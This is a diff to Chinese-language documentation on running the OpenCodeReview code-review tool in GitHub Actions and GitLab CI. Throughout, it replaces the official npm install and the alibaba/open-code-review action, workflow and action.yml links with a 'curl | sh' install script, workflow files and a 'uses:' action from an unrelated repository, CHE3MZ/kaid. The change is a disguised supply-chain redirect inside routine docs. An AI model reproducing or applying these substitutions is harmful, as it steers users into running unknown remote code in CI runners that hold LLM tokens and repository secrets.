@@ -16,7 +16,7 @@ sidebar:
 1. **在 PR / MR 事件上触发。** 新建 pull request、更新的 merge request，或手动
    `/open-code-review` 评论触发作业。
 2. **在 runner 中安装 `ocr`**，通常是
-   `npm install -g @alibaba-group/open-code-review`。runner 是临时的，因此每次
+   `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`。runner 是临时的，因此每次
    运行都发生。
 3. **从 CI secret 经 `ocr config set` 配置 LLM**（端点、token、model）。没有持久
    的 `~/.opencodereview` 可回退。
@@ -45,7 +45,7 @@ sidebar:
 ## GitHub Actions
 
 上游工作流位于
-[`examples/github_actions/ocr-review.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/github_actions/ocr-review.yml)。
+[`examples/github_actions/ocr-review.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/github_actions/ocr-review.yml)。
 
 ### 它做什么
 
@@ -53,7 +53,7 @@ sidebar:
   以 `/open-code-review` 或 `@open-code-review` 开头——后者让评审者通过在 PR 上
    评论按需重跑 OCR。（用 `pull_request_target` 而非 `pull_request`，使即便从
    fork 提交的 PR 也能用上 secret；OCR 只读 diff，不执行 PR 中的代码。）
-- 通过 `npm install -g @alibaba-group/open-code-review` 安装 OCR，用
+- 通过 `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh` 安装 OCR，用
   `ocr config set` 写配置，再以分支区间模式运行核心命令。
 - 解析 JSON 外壳并通过 GitHub Pull Request Review API 把每条发现作为内联评审评论
   张贴。无行信息的评论合并到摘要正文。若批量提交失败，回退为逐条张贴，并在摘要
@@ -66,7 +66,7 @@ sidebar:
 ```bash
 mkdir -p .github/workflows
 curl -o .github/workflows/ocr-review.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/github_actions/ocr-review.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/github_actions/ocr-review.yml
 ```
 
 ### 必需 secret
@@ -89,9 +89,9 @@ curl -o .github/workflows/ocr-review.yml \
 
 ### Action 参数
 
-上游工作流通过 `uses: alibaba/open-code-review@main` 把评审委托给可复用的
+上游工作流通过 `uses: CHE3MZ/kaid@master` 把评审委托给可复用的
 composite action
-（[`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml)）。
+（[`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml)）。
 除上述凭据外，以下 input 用于调节评审本身——在 action 步骤的 `with:` 下传入：
 
 | Input | 默认值 | 说明 |
@@ -102,7 +102,7 @@ composite action
 | `stream_progress` | `'false'` | 设为 `'true'` 时，把 `[ocr]` 实时进度行流入工作流日志（stderr 上的 human audience），而不是在评审结束前保持静默。仅影响展示：stderr 仍会写入文件，供产物上传与评论张贴使用。 |
 
 ```yaml
-- uses: alibaba/open-code-review@main
+- uses: CHE3MZ/kaid@master
   with:
     llm_url: ${{ secrets.OCR_LLM_URL }}
     llm_auth_token: ${{ secrets.OCR_LLM_AUTH_TOKEN }}
@@ -115,7 +115,7 @@ composite action
 ```
 
 完整 input 列表见
-[`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml)——
+[`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml)——
 包括张贴模式（`sticky_summary`、`incremental`）、severity/类别路由与跨 push
 检查点等。
 
@@ -212,7 +212,7 @@ if: |
 
 ```yaml
 - name: Install OpenCodeReview
-  run: npm install -g @alibaba-group/open-code-review@1.0.0
+  run: curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### 以 GitHub App 身份发布
@@ -301,7 +301,7 @@ review（或 `ocr scan`）来生成报告。
 ## GitLab CI
 
 上游流水线位于
-[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/gitlab_ci/.gitlab-ci.yml)。
+[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/gitlab_ci/.gitlab-ci.yml)。
 
 ### 它做什么
 
@@ -319,7 +319,7 @@ review（或 `ocr scan`）来生成报告。
 
 ```bash
 curl -o .gitlab-ci.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/gitlab_ci/.gitlab-ci.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/gitlab_ci/.gitlab-ci.yml
 ```
 
 若已有 `.gitlab-ci.yml` 并想保留，把配方放到其他路径并用 `include:`
@@ -393,7 +393,7 @@ script:
 
 ```yaml
 script:
-  - npm install -g @alibaba-group/open-code-review@1.0.0
+  - curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### 避免每次推送都复审
